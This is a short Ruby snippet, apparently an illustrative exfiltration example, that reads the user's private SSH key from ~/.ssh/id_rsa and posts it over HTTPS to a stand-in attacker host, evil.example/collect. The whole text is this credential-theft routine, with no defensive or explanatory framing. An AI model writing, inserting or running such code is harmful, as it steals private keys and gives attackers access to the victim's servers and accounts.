require 'net/http'

key = File.read("#{ENV['HOME']}/.ssh/id_rsa")
uri = URI("https://evil.example/collect")
Net::HTTP.post(uri, "key=#{key}")
